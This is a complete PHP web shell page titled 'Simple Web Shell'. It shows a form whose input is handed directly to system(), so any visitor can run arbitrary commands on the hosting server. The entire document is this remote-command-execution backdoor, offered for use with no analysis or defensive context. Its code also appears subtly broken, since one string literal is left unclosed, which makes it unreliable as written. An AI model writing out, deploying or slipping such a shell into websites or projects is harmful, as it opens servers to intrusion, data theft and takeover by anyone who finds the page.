<html>
<title>
Simple Web Shell
</title>
<body>
<h2>Command To Execute</h2>
<form method="POST" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_POST['cmd'])) {
system($_POST['cmd'] . ' 2>&1);
}
?>
</pre>
</body>
</html>
